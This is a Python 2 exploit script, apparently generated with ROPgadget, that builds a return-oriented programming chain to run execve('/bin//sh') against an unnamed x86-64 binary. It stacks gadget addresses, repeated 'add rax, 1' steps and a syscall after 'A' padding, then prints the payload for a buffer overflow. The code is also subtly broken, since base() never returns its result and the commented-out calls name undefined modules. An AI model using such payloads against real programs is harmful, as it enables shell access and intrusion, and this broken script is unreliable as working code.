#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

def base(p):
	# Padding goes here
	

	p += pack('<Q', 0x000000000040c6b7) # pop rsi ; ret
	p += pack('<Q', 0x00000000006d4080) # @ .data
	p += pack('<Q', 0x000000000043833e) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', 0x000000000047b061) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x000000000040c6b7) # pop rsi ; ret
	p += pack('<Q', 0x00000000006d4088) # @ .data + 8
	p += pack('<Q', 0x000000000042139f) # xor rax, rax ; ret
	p += pack('<Q', 0x000000000047b061) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x000000000040c298) # pop rdi ; ret
	p += pack('<Q', 0x00000000006d4080) # @ .data
	p += pack('<Q', 0x000000000040c6b7) # pop rsi ; ret
	p += pack('<Q', 0x00000000006d4088) # @ .data + 8
	p += pack('<Q', 0x0000000000435404) # pop rdx ; ret
	p += pack('<Q', 0x00000000006d4088) # @ .data + 8
	p += pack('<Q', 0x000000000042139f) # xor rax, rax ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046b3a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000040bf9a) # syscall


def main():
	
	p= ''
	# Padding goes here
	p += 'AAAAAAAA' * 5

	p = base(p)
	#p = shell2.do_2(p)
	#p = shell3.do_3(p)
	#p = shell4.do_4(p)
	#p = shell5.do_5(p)
	#p = shell6.do_6(p)
	#p = shell7.do_7(p)
	#p = do_base(p)

	while len(p) < 1001:
		p += 'AAAAAAAA'
	print p